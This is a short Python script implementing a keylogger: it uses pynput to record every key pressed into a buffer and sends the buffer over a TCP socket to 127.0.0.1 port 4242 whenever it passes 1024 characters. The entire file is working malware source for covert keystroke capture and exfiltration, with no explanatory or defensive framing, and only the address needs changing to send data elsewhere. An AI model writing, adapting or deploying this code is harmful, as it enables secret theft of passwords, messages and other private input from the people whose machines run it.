import pynput, socket, time
from pynput.keyboard import Key, Listener

data_to_send = ""

def send_data():
    
    global data_to_send
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 4242))
    
    while True:    
        if len(data_to_send) < 1024:
            time.sleep(0.5)
        else:
            sock.send(data_to_send.encode())
            data_to_send = ""

def on_press(key):

    global data_to_send

    key = str(key).replace("'", "")
    data_to_send += "[Key Pressed]=> {}\n".format(key)
    

with Listener(on_press=on_press) as listener:
    send_data()
    listener.join()